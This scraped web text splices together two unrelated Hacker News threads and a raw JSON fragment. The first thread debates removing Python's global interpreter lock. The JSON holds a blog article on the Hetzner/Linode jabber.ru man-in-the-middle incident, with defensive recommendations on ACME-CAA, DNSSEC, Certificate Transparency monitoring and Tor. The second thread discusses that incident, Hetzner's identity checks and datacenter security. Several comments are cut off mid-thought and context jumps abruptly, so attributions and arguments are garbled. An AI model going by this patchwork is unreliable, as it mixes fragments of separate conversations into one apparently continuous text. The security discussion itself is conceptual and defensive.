see this in the move to async and it will only be worse with threading.So sad to say I think sticking to GIL and using the approaches I mentioned above (along with others that work well for concurrent, rather than parallel, computing, like coroutines) is the best thing to do right now and I&#x27;m a bit bummed that the leadership signalled their intent to accomodate both. reply alfalfasprout 12 hours agorootparentYou&#x27;ve been able to release GIL for a long time though in the C ABI (and C++ via pybind) and that hasn&#x27;t removed the need for nogil.The reason is that a single thread can invoke multicore c&#x2F;c++ code (even calling into specialized accelerators if needed) but having python objects that are shared between threads is extremely clunky. And multiprocessing results in a lot of communication overhead. Worse-- python code cannot proceed in another thread.

So that&#x27;s really more on the aiobotocore developers than python in that case. https:&#x2F;&#x2F;github.com&#x2F;aio-libs&#x2F;aiobotocore&#x2F;issues&#x2F;890 OK not a great example but also not worth debating about. reply FridgeSeal 11 hours agorootparentprevI think this is an interesting take, and it think people should think about their use of Python in general.I personally think that pythons support for the massively parallel hardware we have is lacking, and the devs are being too slow and disparate to respond, combine that with what is basically subpar tooling around threads and you have people reaching for multiprocessing out of necessity.Off the back of this, should Python just maybe give up on threads entirely? Should it relegate itself to simple-scripting and open the floor to something that can do these things?I’ve personally stopped writing Python for these reasons- apart from “AI stuff” which isn’t something I dabble in anymore, there’s nothing that Python can do anymore that another language can’t do better, just as (if not more) easily, without giving anything up. reply lagt_t 10 hours agorootparentprevOptional Gil was originally discussed in 2022, PEPd in early 2023 and approved for 3.13, What do you mean going nowhere or that leadership didn&#x27;t want it? reply akubera 9 hours agorootparentI think dekhn means the discussions and attempts at removing the GIL before this current PEP.

Also, most parallelism is found on the GPU platforms.The alternative road is to figure out how Python could automatically exploit parallelism in the underlying hardware, possibly in a way that would let it work on GPUs as well. The SIMT data-parallel way (seen in eg in ISPC, OpenCL, shader languages) is also more programmer friendly as it doesn&#x27;t require the constant use of error probe synchronisation primitives.

You can only parallelize in the native code if the boundary between Python and native code is absolute. But in practice people really do want to pass callbacks into the native code, inherit from native code interfaces in Python, even something as simple as forwarding the logging in their native code back to Python logging (e.g. all of the really useful behavior possible with binding tools like pybind11).

This is pretty key for ML-- in fact this current incarnation of the PEP came from the PyTorch team.Single threaded performance is important too but there have already been lots of decent workarounds for critical sections (eg; numba, Cython, and now things like Mojo).The ordering is important too-- a lot of the faster cpython work would be thrown away completely if nogil came about. So the teams have had to coordinate.In the ideal world that means both nogil mode + improvements to single threaded performance (Guido even hinted sophisticated JITing is being considered). reply euiq 13 hours agoparentprevI think you&#x27;re missing that your needs are different from those of the people quoted in PEP 703:reply benrutter 13 hours agoparentprevMy understanding is they are two seperate projects within cpython and don&#x27;t necessarily have the same people working on them.I agree with you that if it was one or the other, most use cases are gonna be better met with straight up faster single threaded code.

Getting rid of the Gil will slow down single threaded code. reply Jtsummers 13 hours agorootparentThe last numbers I saw put the performance penalty of no-GIL at under 10%, so both are still on the table since Python has a lot of single-threaded performance left to recover.

It&#x27;s the same kind of hit you get going from thread-unsafe code (hopefully intended for single-threaded execution) to thread-safe in any other project (since, well, it&#x27;s the same; the GIL means they could write code with single-threaded assumptions). Checking and taking locks is not a free action. reply rowanG077 12 hours agorootparentI thought the point of No-GIL was to force users of python to provide proper locking. reply Jtsummers 11 hours agorootparentTo achieve no-GIL, libraries and extensions along with the underlying language implementation will need to add in the proper locking.For users, it&#x27;ll be mixed. Users writing single-threaded code shouldn&#x27;t have to change a single line of code, but they&#x27;ll see (sans the concurrent efforts to speed up the underlying implementation) slower performance due to everything done to achieve no-GIL (the actual net effect will be a performance boost due to that concurrent effort over time). If they&#x27;re writing multi-threaded code, then they should be writing it to be threadsafe now, not assuming that the GIL will protect them (because it doesn&#x27;t guarantee it now anyways). So nothing should actually change for most users of Python if they&#x27;re writing correct code today. reply kortex 9 hours agorootparentprevPython&#x27;s reference counting garbage collector would also need concurrency controls. reply viraptor 13 hours agorootparentprevYou still need to run the same memory management&#x2F;accounting for all the objects as when you run multithreaded, because at any point a new thread may be started.

Unless you are using python as nothing else than glue code, and loading and preprocessing the data entirely outside of your python code. At some point (and I&#x27;m not talking about extreme scales here, just feeding a single datqaloader can be enough) you hit a very hard performance bottleneck. Sure you can just use more external code at that point but I think the intention is to make python at least more suitable for the non compute intensive stuff.Like, it is already suitable right now but it&#x27;s not getting better, while everything around it is (I&#x27;m not talking about other languages, what I mean is that the tools and libraries are getting better so without improvement to the language the bottleneck will just get worse) reply jhj 13 hours agorootparentprevYes but coordinating the computationally expensive parts usually needs to be done across multiple CPU threads. Typically one should feed each GPU from a different CPU thread, even in native C&#x2F;C++ land, as in many cases the kernels being run on the GPU may not be entirely heavy compute but instead on the order of the kernel launch overhead from the host (1-4 us); not every kernel run would be orders of magnitude longer runtime than the overheads involved. Data loaders and other non-computationally expensive parts (I&#x2F;O latency or throughput bound things) need to be done as well, which make sense to multi-thread as well. reply fulafel 6 hours agorootparentprevPeople in the Numpy&#x2F;ML user camp are like this, but in general usage the computationally expensive parts of Python code are heterogenous application code written with Python dicts, lists, etc that could be run much faster (as evidenced by JS). reply kzrdude 2 hours agorootparentprevnumpy developers seem to prefer a GIL-less python, so better numpy (and other libraries) are possible without GIL. reply rvanlaar 13 hours agoparentprevThere&#x27;s a GIL presentation [1] from 2010 which shows Python 3.2 on a 1 CPU machine was faster than on a dual core.In all, there might be reason to expect GILless python to be faster single core in certain scenario&#x27;s.[1] https:&#x2F;&#x2F;youtu.be&#x2F;Obt-vMVdM8s?t=2047 reply c-smile 6 hours agoprevKeep GIL but introduce Workers a la JS [0] ?Worker [thread] is a sandboxed VM [context] with its own GIL.Communication between these is done through messaging so no sync primitives are required.Go&#x27;s routines have similar concept.I think that if it OK for Go it should be OK for Python, no?[0] https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;API&#x2F;Web_Workers... reply dragonwriter 6 hours agoparentThat&#x27;s subinterpreters in a single process, and the Python runtime already has that (though the only API is from C, not Python, currently); Python API is planned for 3.13. reply akdor1154 4 hours agoparentprevGo also has very easy data races when accessing the same data from different goroutines, I&#x27;m not sure Python would accept such a well-cocked footgun. reply tgv 3 hours agorootparentNo-gil has this plus a bigger footgun. reply johncolanduoni 3 hours agoparentprevThat doesn&#x27;t get you much more than Python&#x27;s multiprocessing; you still need to have any state shared between the processors in a simple linear memory and not in Python objects if you follow the web&#x27;s model of postMessage + SharedArrayBuffer. reply ksec 5 hours agoparentprevSounds like Ruby&#x27;s Ractor. reply thibaut_barrere 3 hours agorootparentExactly! reply _ZeD_ 4 hours agoparentprevthat&#x27;s... awful reply parhamn 12 hours agoprevHindsight is 20&#x2F;20 but if the Python folks knew how long and bad the 2 to 3 transition would be, they probably would&#x27;ve committed to a much bigger facelift on the interpreter internals too.12 year transition and single threaded performance is still abysmal and it has a few painful transitions left to get to real multi-threading.As kind as one should be with opensource development, at some point is it fair to call it a very poorly managed language? reply jeremycarter 11 hours agoparentYes, you&#x27;re correct.

    "originLink": "https://www.devever.net/~hl/xmpp-incident",
    "originBody": "Home Narrow mode Other articles in this series: Let's Encrypt now supports ACME-CAA: closing the DV loophole Mitigating the Hetzner/Linode XMPP.ru MitM interception incident Mitigating the Hetzner/Linode XMPP.ru MitM interception incident (If you just want some recommendations for what to do, skip down to the Recommendations section below.) Today, the operator of jabber.ru and xmpp.ru reported that their service had been successfully subject to a man-in-the-middle attack via a combination of their hosting providers, Hetzner and Linode, intercepting traffic to their machines; and the unauthorized issuance of a Domain Validation certificate for their service by an attacker. It seems likely that this attack was orchestrated by the state of Germany (or Germany acting in concert with one or more other nation states). There are other possibilities; for example, both Hetzner and Linode might have decided to voluntarily comply with a wiretapping request from a foreign power that was not binding upon them, but this would reflect extremely badly on them, might well be illegal, and seems unlikely. Detection. This attack could have been mitigated. It could also (potentially) have been detected: The first way to detect this attack would be for the operators of the service to monitor Certificate Transparency logs to detect the issuance of certificates they did not request. There are some services which can do this for you, but we could probably still stand to have better tools here (e.g. tools which are good at notifying you only of certificates you didn't request). The second way to detect this attack would be to periodically connect to the service and check that the public key used by the TLS server matches that expected. Both of these detection methods have some issues and potential gaps: CT is optional. A certificate issued by a legitimate CA isn't necessarily logged to a CT log. Surprisingly, CT logging is still not a requirement of the CA/Browser Forum Baseline Requirements (which set the rules all CAs must follow). What forces CAs to log certificates in CT is that web browsers now reject certificates unless they contain a cryptographic proof that they were logged to a CT log. Some CAs will sell you a certificate that isn't logged to CT (e.g. for “privacy” reasons) if you request one. Browsers may reject this, but there are many other kinds of client application (most of them, in fact) which don't check for or require a certificate to contain a proof of having been logged. So in this hypothetical scenario, the adversary could have procured an unlogged certificate. Selective MitM. Trying to detect the MitM by probing the service could be worked around by detecting which connections are probing connections and not MitM'ing them. At a minimum it would be necessary to do something like perform the probe through Tor to prevent it from being trivially identified; however, this probably isn't perfect either. TLS stacks can be easily fingerprinted, as things like the order that TLVs are listed in give telltale signs of which TLS implementation is being used; it's quite likely that a service could have some level of success distinguishing between connections made by a real XMPP client and a probe agent. There's a million signals that could potentially give away that a connection isn't a “real” connection. An adversary could also just target specific persons it knows it is interested in intercepting (i.e., only MitM traffic on a whitelist, rather than exempting traffic on a blacklist of known probes). This therefore probably can't be considered too reliable either. So neither of these detection methods seem particularly perfect. Mitigation. The second area of consideration is mitigation, in which the unauthorized issuance of TLS certificates is prevented from happening in the first place. The entire point of a TLS certificate is, of course, to prevent a man-in-the-middle attack. The fundamental problem here is that the “Domain Validation” model by which CAs validate control of a domain name is ironically itself vulnerable to man-in-the-middle attacks, especially if an attacker can intercept not just some but all traffic to a victim site (as happened in this case). Some years ago I authored ACME-CAA (RFC 8657), now implemented by Let's Encrypt, which can mitigate this in some circumstances. The basic idea is that you can configure a DNS record which specifies that only a specific account of a specific CA is authorised to issue certificates for a domain. Thus simply using the same CA isn't enough; you must gain access to the same account at the CA. With Let's Encrypt, this means gaining access to the ACME private key used to request a certificate. Based on what we know about the attack, it would have been prevented by deploying this extension. There are a fair number of caveats here, which are explained in full in the RFC and my deployment advice (recommended reading). The RFC is a lot more readable than most, so flipping through it is highly recommended for those interested in deploying ACME-CAA. Some caveats are as follows: You do need to deploy DNSSEC for this to work, otherwise the DNS requests made by a CA can simply be intercepted. Anyone who can get control of your DNSSEC signing key can also overcome this hurdle. So for example, a nation-state might simply serve a wiretap order to a hosting company like Hetzner or Linode, and similarly order your DNS service provider. It should be noted that it is possible to run a DNSSEC-secured DNS zone without giving your signing keys to anybody else; in this case the DNS hosting provider has no power to compromise the zone, so this seems like the best deployment strategy. An adversary might be able to successfully compel your domain name registrar, or the TLD registry, to change the DNSSEC signing keys registered for a domain. This at least has the potential to be a “noisy” operation, and due to the nature of DNS caching, it may be hard for an adversary to prevent a recurring probe from detecting the change of key (unlike the selective MitM of a TLS connection discussed under Detection above). An adversary might be able to successfully compel your CA to mis-issue a certificate. You remain vulnerable to third party CAs which screw up or break the rules. The CA/Browser Forum Baseline Requirements now require DNSSEC to be checked by CAs, but a third party CA might mess up and issue a certificate anyway even if it's not listed by a domain's CAA record as authorised to issue certificates for the domain. Because logging to CT logs isn't a requirement, such certificates may never even be detected. This is not an exhaustive list of cavets and you should refer to the RFC for the full details. Nonetheless, deploying ACME-CAA can offer a real level of mitigation here. It increases the number of hurdles for an attacker, especially when you spread different services around different jurisdictions. The game here is jurisdictional arbitrage and utilising the relative difficulty of international cooperation between adversarial powers. For example, if we assume that this incident is the product of coercion on the part of the German state, it doesn't necessarily follow that this adversary would be able to also coerce Let's Encrypt, for instance. Increasing the cost of attacks and the risk of them being detected also discourages nation-state adversaries, particularly as they are often loathe to have attention drawn to their espionage activities. What would a perfect attacker do? While the core aspects of this attack may have been readily mitigated with technologies which were available but undeployed, it also has highlighted some serious gaps in the TLS infrastructure as it is deployed today. In this particular incident, the adversary was slapdash, and let their illicit certificate expire. In this regard, they are less than a perfect adversary; but we should expect attacks such as these to get better, not worse, and to become more frequent, as nation-states become more frustrated by the presence of cheap and easy encryption. As such, it's useful to consider what a more competent nation-state adversary (whom I'll name Mallory for our purposes) would do. Here, I'll assume that Mallory can do anything other than actually compromise the victim machine itself or its operator (which is not a good assumption, but bear with it): Mallory would take advantage of the fact that CAs aren't required to log certificates to Certificate Transparency logs, and request an unlogged certificate from a CA. Mallory would compel the hosting provider to MitM all traffic going to the victim machine. Mallory would use TLS stack fingerprinting and source IPs to heuristically identify traffic likely to be of interest and exclude traffic likely made to probe if the victim service has been compromised. Mallory would use the MitM to trick the CA into thinking Mallory is the legitimate controller of the victim domain. If the domain uses ACME-CAA with DNSSEC, this attack is foiled, so Mallory would attempt to compel the DNS hosting provider (if it holds the DNSSEC signing key, which it may not). If Mallory fails to do so, Mallory might try and coerce the domain registrar or TLD registry, but might have difficulty preventing this from being detected (if anybody is monitoring it, which usually isn't the case). Mallory also might attempt to coerce the CA itself. Holes in the TLS infrastructure. This hypothetical attack illustrates the following holes in the present state of the public TLS infrastructure, ordered in descending order of severity (in my opinion): Lack of CT logging enforcement by non-web TLS clients. Point (1) here is interesting, even if the actual attacker here did not take advantage of it. Web browsers now require that CA certificates include cryptographic proof of having been logged to a Certificate Transparency log, so while you can legitimately get an unlogged certificate from a CA, it's not so useful on the public web. However, it turns out there is a degree of inconsistency here. While web browsers enforce this requirement, most other TLS clients don't, and will accept an unlogged certificate. This probably includes most XMPP clients, as this CT validation is something that needs to be specially implemented. It is not something that is enabled “automatically” just by linking your application against OpenSSL. This means that a large amount of internet infrastructure which supposedly benefits from the security provided by contemporary TLS, actually receives a lower standard of protection than that of a web browser. Such infrastructure is easier to exploit because it will accept an unlogged TLS certificate, which CAs are legitimately allowed to issue. This seems to me a highly undesirable state of affairs, and thought should be given to how CT proof enforcement can be enabled by default in the future. Software which is liable to be used for highly sensitive communications (such as XMPP clients) should also consider reviewing how they are currently handling this issue and consider adding support for CT enforcement. Lack of requirement to log certificates. The CA/Browser Forum Baseline Requirements, which is the set of industry rules CAs are required to follow (lest they be given the CA death penalty), does not require certificates to be logged to CT logs. This is arguably a surprising omission and I would argue this should be required. Of course, in reality, this omission is surely not accidental; there are too many companies which think hiding a hostname from a CT log is a meaningful form of security by obscurity, and I assume it's the advocacy of these organisations that has kept CT from being mandatory. But it is certainly something I would advocate for, and I would hope the CA/Browser Forum reconsiders this in the future. In any case, this issue can be rendered moot by universal deployment of the technical enforcement of CT logging, as per the above paragraph. Need for more CT monitoring services. This is not really a gap in the TLS infrastructure as such, as anyone could create such a service, but the public would benefit from more CT monitoring services. The current major service available for CT alerting is SSLMate's Cert Spotter, but its pricing probably puts it out of reach for many services, especially those operated on a voluntary basis. It should be emphasised that any CT monitoring solution needs to think through how to avoid false alarms and only alert when observing unusual or seemingly unauthorized certificate issuance. Lack of DNSSEC transparency. Although the idea has been mulled in the past, there is currently no deployed cryptographic infrastructure for detecting changes to the DNSSEC keys configured for a domain. This renders domain name registrars and TLD registries vulnerable to coercion or compromise to change the DNSSEC keys registered for a domain, which allows the protection which ACME-CAA can offer to be undermined. It would be highly desirable to see a transparency solution for DNSSEC zone keys ensuring that all changes are publicly visible. This transparency solution would only need to log changes to a zone's keys (DS records), not all records in a zone. (The latter is also possible but I wouldn't consider it essential, and organisations who have grown accustomed to the contents of DNS zones being un-enumerable would inevitably complain.) Recommendations With all this in mind, here are some recommendations for various parties: I operate a service which I am concerned may be targeted by a nation-state. What should I do? The following are ordered in ascending order of effort required compared to gain offered — in other words, do the first things first and work your way down until you reach the item you decide is beyond your budget. Deploy ACME-CAA. Deploying ACME-CAA is likely to make it harder for attackers to trick CAs into issuing a certificate for your domain. For guidance for those unfamiliar with this area, read my blogpost about deploying ACME-CAA. I also recommend reading the Security Considerations section of the RFC, which is more readable than usual and contains a lot of good advice and important caveats. If deploying ACME-CAA, also deploy DNSSEC. ACME-CAA is not maximally effective without use of DNSSEC. If possible, choose a DNSSEC provider that does not require you to give them your signing keys. Don't use Cloudflare or similar services. See my article here for an explanation on why. If you use a service like this, you're basically already MitMing yourself. Sign up with a CT log monitoring service, or manually check logs regularly. SSLMate's Cert Spotter offers an automated monitoring service, for a price. crt.sh offers a search engine which allows you to manually search the CT logs. Make use of jurisdictional arbitrage. For example, your domain registrar, TLD registry, DNS hosting service, CA and hosting provider might all be situated in different countries. Consider which nation-states and geopolitical blocs are least likely to cooperate with one another and choose jurisdictions accordingly. Play jurisdictions off against one another. You can never count on this, but it may help. Provide a Tor hidden service. One potential solution to these kinds of issues is simply to sidestep TLS altogether by providing a Tor hidden service instead and encouraging users to use it. The advantage of a Tor hidden service is that the service's public key is the address, so there is no CA or other centralised infrastructure to be fooled or compromised (and the problem of most non-web clients not requiring CT proofs becomes moot). Encourage users who consider that they may be at high risk of being targeted by a nation-state to use the hidden service (of course, encouraging such users to use Tor is good advice in general). If the nature of your service is such that extreme risk is posed to your users in particular, consider only offering a hidden service. Remember that your users will need a trustworthy channel to obtain the correct onion address, and third parties might try to trick them into using the wrong one. Setup automated probing of your service via Tor. This is not a panacea as discussed above, but it is some icing on the cake you can perform if you really want to, which will catch amateur mistakes (which, as we have seen from this incident, often occur in the real world). It's essential to use Tor to prevent ready identification as a probe (a nation-state adversary is probably interested in users connecting via Tor, so it is unlikely to want to skip this traffic unless it already has a specific non-Tor-using user in mind). Try to minimise the prospect of TLS fingerprinting by using the a TLS library commonly used by client software. Even better, use an actual client (e.g. an actual XMPP client if you are running an XMPP service). Note that even if this does work, it still only detects compromise after the fact, and by that time your users may already have been harmed by the compromise. Consider other attacks. If you make your service too hard to MitM, adversaries are more likely to engage in other attack vectors, like compromising the machines themselves and stealing private keys or sensitive information. A nation-state attacker could compel a VM provider to perform a dump of your system's memory at the hypervisor level, which will be entirely undetectable to you and compromise all data held in that VM. A dedicated server could be compromised by physical access by an attacker. Don't focus irrationally on the mitigation of one attack vector at the cost of others. A good understanding of the MO of your likely adversaries is helpful here. Assume the worst. Ultimately, in most cases, the best interest of your users likely requires you to advocate that they adopt end to end encryption and assume that you have been compromised despite your best efforts. Note that “end-to-end” encryption delivered as a web application is not a meaningful protection. I am the CA/Browser Forum (or a member with a vote in it). What should I do? Require all certificates to be logged to a CT log, or raise a proposal to that effect. I mean, really. Just do it already. I am an application client software vendor. What should I do? SCT enforcement. Add support for enforcing the presence of CT proofs (known as Signed Certificate Timestamps (SCTs)) in TLS certificates, and enable this support by default. Advertise this so that users know they benefit from this protection if they use your software. However, be advised that there is some volatility around enforcing CT proofs, as this comment highlights. FOSS is essential. Make sure your software is open source so that it can be publicly audited. Consider supply chain risks and your own vulnerability. It's unrelated to this attack, but you should also consider encouraging distribution channels you don't directly control (like Linux distribution's package repositories) to reduce the harm that may come in the event that you yourself are legally compelled to compromise your software. See my article on issues with web-based cryptography for some food for thought here. I am an end user. What should I do? Assume services are compromised. At the end of the day, even if the party running a service is genuinely well-intentioned, their service may be compromised despite their best efforts. This is just fundamental good advice. Don't trust a service if your life might depend on its not being compromised. Use end-to-end encryption technologies (and check your friend's fingerprints). Use end-to-end encryption technologies. For XMPP, this means using OMEMO or OTR. Remember to always verify the fingerprint of the party you are communicating with. Don't use web-based software for end-to-end encryption (or assume it is compromised, at least). Consider using a Tor hidden service if your service provider offers one. Enough said. Make sure you get the onion address from a trustworthy source. I am a CA. What should I do? ACME-CAA. If you don't already offer support for ACME-CAA (RFC 8657), please consider implementing it. Note that you do not have to be an ACME-based CA to implement it. Require CT. While the CA/Browser Forum rules currently allow you to skip logging certificates to CT, for example if a customer requests it, consider leading by example and adopting a policy of always logging certificates to CT. I am a standards author. What should I do? Maybe we should revisit the possibility of DNSSEC transparency, at least for DS records. By all means contact me if you're interested in this. I am worried about my hosting provider compromising my machine (not just MitM'ing it). Is “confidential computing” any good? Not really. Every current technology purporting to offer “confidential computing” has a ton of issues (and I intend to blog in detail on this in the future). I mean, look — deploying it is probably better than doing nothing. But don't count on it to be secure — every single one of these “confidential computing” technologies (AMD, Intel, etc.) is dependent on a vendor golden key which can be used to backdoor the system. A nation-state can just compel them to turn over the key and these schemes fall apart. It used to be we laughed any security system dependent on a golden key or with a backdoor like this out of the room, yet here we are and serious people are taking “confidential computing” seriously.1 See also (Original article) Encrypted traffic interception on Hetzner and Linode targeting the largest Russian XMPP (Jabber) messaging service ACME-CAA (RFC 8647) Let's Encrypt now supports ACME-CAA: closing the DV loophole Web-based cryptography is always snake oil Cloudflare considered harmful 1. Confidential computing would be really interesting if it did actually work, and I think there may be ways of creating a confidential computing scheme which isn't dependent on a golden key.

Unfortunately jabber.ru is running server software from 2016, and that old version doesn&#x27;t support it.Pinning is problematic these days, because certificates are short-lived and renewed frequently. Users would be constantly asked to accept new certificates on a monthly basis, and they wouldn&#x27;t think twice about clicking &#x27;Accept&#x27; on an attacker&#x27;s certificate then.Channel binding works regardless of the certificate, and ensures the TLS stream is terminated by the entity you exepect.The focus on (lack of) CT&#x2F;SCT support in XMPP clients puzzles me, because it would not have detected this attack at all, which used valid CT-logged certs from Let&#x27;s Encrypt. SCT verification would help detect theoretical issuance from another CA if they had a strict CAA record in place (they did not). But even then, channel binding is more privacy-friendly and does not depend on a third party. reply knorker 2 hours agorootparentPinnig is based on the keypair, not the cert. You can renew and not break pinning, right?Also you can phase in a new cert with pinning. reply MattJ100 2 hours agorootparentYes, you can pin the public key instead, which is generally more helpful. But most ACME clients (including the \"official\" certbot) default to rotating the key too.

If they intercepted 5223 they would have to do their own client-side TLS handshake with the attacked server, which would look really obvious to anybody doing TLS fingerprinting on the server: all of a sudden, 100% of their clients have the exact same TLS fingerprint.Stop outsourcing your PKI to ICANN, folks.

Enter HSM - Hardware Security Module. A wildly complex topic I cannot hope to cover in an HN comment, but fundamentally, the private keys are not on the same HW as the server software which needs them.A fundamental property of an HSM is that you, the HSM user, don&#x27;t actually see the private key. You can ask the HSM to generate one. Derive things from it (in the cryptographic sense of derive). Even prove the provenance of such derived data. But the HSM should not reveal the actual private key.In the cloud world, the HSM equivalent is known as KMS (Key Management Service), and the Good cloud providers all let you manage your own (with the downside being that you now need to manage your own keys). reply fulafel 6 hours agorootparentprevHere&#x27;s a good example why trust is not binary (\"you either trust Hetzner or don&#x27;t\").

That&#x27;s what the web PKI is used for.Of course, if you do provide your own clients, this just moves the problem further up the chain - in this case the place where customers would download the custom client software would be compromised and a malicious client served instead. reply LeoPanthera 10 hours agorootparent> How would you do certificate pinning if you don&#x27;t control the clients?Well you cannot. If you were paranoid, you would perhaps supply a hash through some out-of-band mechanism, which would require manually updating for each new cert.Obviously most people wouldn&#x27;t ever want to do that. reply dist-epoch 10 hours agorootparentprevIsn&#x27;t this what those \"key hash pictures\" in WhatsApp&#x2F;Signal are solving?XMPP clients could implement such a mechanism, and if any certificate&#x2F;domain along the path changes, the users in a conversation would be notified. reply WhyNotHugo 1 hour agorootparentThese are usually to validate the keys used in end-to-end encryption.

I hate mass surveillance as much as the next guy but why target Russian domains specifically? reply OmarAssadi 5 hours agoparentI can&#x27;t imagine it is war-related, or at least not in any direct sense, like literally trying to intercept soldiers or spies.I think the more likely scenario is that someone was to catch carders&#x2F;botnet operators, since Jabber&#x2F;XMPP is still very popular amongst people in that scene in Russia; you&#x27;ll see often see screenshots or logs containing @exploit.in, @jabber.ru, and various other servers pretty much in any Krebs on Security article, for example.That said, I think mass-surveillance is usually pretty gross regardless of intent.I don&#x27;t know what the exact ratio of criminal to non-criminal usage of either server is, but just like how Tor simultaneously has a ton of obviously illegal content mixed with whatever percentage of legitimate use [1], they presumably still do have a fair amount of totally normal conversations going on. And so I&#x27;m not an exactly a huge fan of invading privacy in order to spy on random cybercriminals likely far out of your jurisdiction in countries unwilling to extradite in the first place.And while I understand if Hetzner was forced to comply, unless they wanted to become another Lavabit, as someone who recommends them often, it&#x27;ll still be a little disappointing, IMO, if it turns out they were aware and allowed or assisted in the MitM attack, because otherwise, I think they&#x27;re one of the best hosting companies.Their transparency is great. And I get better uptime, reliability, and support than the overwhelming majority of cloud providers without selling my organs to afford it. And their effort put into turning environmentally-friendly design choices into economically smart choices is commendable.The \"reduce\" in reduce > reuse > recycle can be seen in their KISS designs—like the raised, angled roof, allowing natural heat escape rather than loads of HVAC [2]; server chassises that are more bare-minimum structural support and air-shrouds than actual chassises; and stripped-down standard motherboard designs with only the most minimal changes, like 90-degree rotated sockets to allow a single fan to cool the VRM, CPU, and memory [3], rather than a dozen screaming, power-slurping Delta fans for every server.And their knowledge of \"reuse\" is evident by their server auctions, where they do Dutch-auction-style rentals of legacy hardware rather than scrapping everything, avoiding spending a load on new hardware while also avoiding the environmental cost associated with manufacturing new everything each generation.I&#x27;d love to be able use them more if only they had dedicated servers outside of Europe.[1]: \"legitimate\" is hard to define anyway; one country&#x27;s journalist is another&#x27;s \"foreign agent\", and one country&#x27;s \"freedom fighter\" is another&#x27;s \"terrorist\".[2]: Der8auer: Over 200,000 Servers in One Place!

The problem this require-CT behaviour isn&#x27;t switched on by default for basically any TLS library, so an XMPP client developer would have to go out of their way to switch this on, and I assume most or all (currently) don&#x27;t. That can change of course. reply jeroenhd 9 hours agorootparentHow problematic is that in real life? All CAs worth their salt are already publishing all certificates to CT logs because most TLS servers are browsers and most clients are browsers.Maybe there&#x27;s a CA somewhere that has opt-in CT logging enabled, but I don&#x27;t think they&#x27;re very popular. For example, even the rogue CA certificates were published onto the CT log (because Let&#x27;s Encrypt does so by default).I think a CT check shouldn&#x27;t be a very problematic change in practice, as long as there are reasonable exemptions (i.e. don&#x27;t require CT for certificates imported into the CA store, allow the user to disable the check, etc.). For serverserver communication things become more difficult, but the entire network would be better off if a major server like ejabberd were to require CT. reply manxman 7 hours agoprevA quick warning on hetzner. I needed a personal bare metal machine so signed up.I was travelling and on an IP in a distant land so their sign up asked for secondary verification via PayPal.

They also said I could hide anything sensitive other than my name and date of birth!!I suggested the process is not GDPR compliant as anyone could intercept unencrypted emails and that they should talk to a lawyer if they did not believe my assertion.Within a short time the server was approved and online.

They refused to tell me how I could still proceed, and I would&#x27;ve happily paid a year in advance or something. Heck, I could&#x27;ve probably visited their office in person.I did try to register from a Protonmail account because I self-host my email and don&#x27;t want to run into a chicken-and-egg problem (need to mail them because my server is down, can&#x27;t mail them because my server is down...), so perhaps that was the issue.Because Hetzner refused my business I was forced to look for another provider, and I&#x27;ve been using OVH without any issue for a few years now.

The Stasi mentality lingers on and accomplishes nothing. reply OmarAssadi 3 hours agorootparentI think it is less Stasi and more so 30 euro dedicated servers with unmetered gigabit lines are ripe for bad clients.You&#x27;ve got the general issue of abuse and fraud that all providers face. But I think there are two issues that make it worse for companies like Hetzner, OVH, and other low-cost providers:1. Chargebacks are a big deal, both in terms of being cut off from payment networks but also the fees imposed, which are especially harsh if your margins are likely razor thin sometimes; looking at the server auctions right now, it&#x27;s kind of wild that Hetzner manages to give you a place in a datacenter, 3700X, 64GB RAM, 2x1TB enterprise SSDs, and unmetered gigabit on a decent network for 33 euros while still making a profit.2. I would imagine that attempting the proper credit-card theft kind of fraud is also more of an issue for low-cost providers, not only because of #1, but because I think you&#x27;d manage to keep and abuse servers bought with stolen money for a lot longer; I think legitimate owners of said cards are less likely to notice 30 euro charges every month compared to being robbed blind by unexpected AWS fees.I&#x27;ve had to deal with anti-fraud paranoia from OVH, BuyVM, Hetzner, and many others, likely all for the same reasons as Hetzner.Both Hetzner and OVH refused to provide me service without photo ID or a passport. BuyVM refused one of my Jordanian friends entirely unless he paid in crypto. And while minor in comparison, I&#x27;ve had to change my PayPal email to match my account email on BuyVM despite it literally previously being paypal@myfirstandlastname.tld.Not meant to be a dig at BuyVM, btw, even though the crypto bit may seem harsh. I really like them; freedom to host pretty much anything that isn&#x27;t straight-up illegal, even Tor exit nodes, the support is good, they&#x27;re often around and transparent in the community chat, and it&#x27;s hard to beat free BGP announces, up to 10Gbps speeds, anycasted VMs across Europe and the US forWhat would a perfect attacker do?If you had physical access to the computer, some sort of bus interception to exfiltrate data from the machine. reply manxman 7 hours agoparentThinking laterally for a moment regarding the big picture here, why do we still rely on data centres.They made sense in a world of dialup and low speed &#x2F; high latency broadband. But there are lots of places with high speed fibre and not much latency to the peering points.And the more we break away from data centres and clouds, the more the internet infrastructure will have to work the way it was designed instead of having to flow through these crazy aggregation points that are both serious points of failure and major security risks. reply WhyNotHugo 1 hour agorootparentRegular domestic connections often block ports (especially email). In many countries, ISPs won&#x27;t sell you a static IP (your dynamic address might not change ever, but you don&#x27;t control rDNS records).These kind of measures force people to move onto a rented server instead. Often ISPs rent servers themselves. The conflict of interest here is hard to ignore: if ISPs make it easy and convenient to host from home, their business of renting servers suffers. reply whalesalad 11 hours agoparentprevextremely difficult to get physical access in a datacenter reply jacquesm 9 hours agorootparentAll the people working in the datacenter have that level of physical access.Unless they are very closely supervised they can do a lot of damage without anybody being the wiser until they get caught. I&#x27;ve been in (nominally very secure) DCs on behalf of customers and I&#x27;ve seen:- unlocked racks- doors open- temporary network cables and keyboards, monitors and mice attached to running systems- systems logged in left unattended- floor panels raised up and left open unattended exposing cabling- meet-me rooms with interfaces exposed (gear in racks without doors)DC personnel tends to trust each other, and they probably shouldn&#x27;t. But it&#x27;s hard to be part of a closely knit crew for a long time without getting into a &#x27;get stuff done&#x27; mode where protocol and rules are there in principle but less so in practice because it is seen as an efficiency penalty. It&#x27;s another instance of the &#x27;normalization of deviation&#x27; phenomenon. reply manxman 7 hours agorootparentAgree re: everything you said but wanted to add datadentre security staff are some of the most interesting characters I’ve encountered.

However, if they refuse to comply, realistically you just have to let them in anyway. Document their non-compliance and provide it to your lawyers, who can decide what action to take (lodge a formal complaint to the law enforcement agency, apply to a judge for an injunction to compel their compliance, etc)Well, that’s true in countries like Germany or the US.

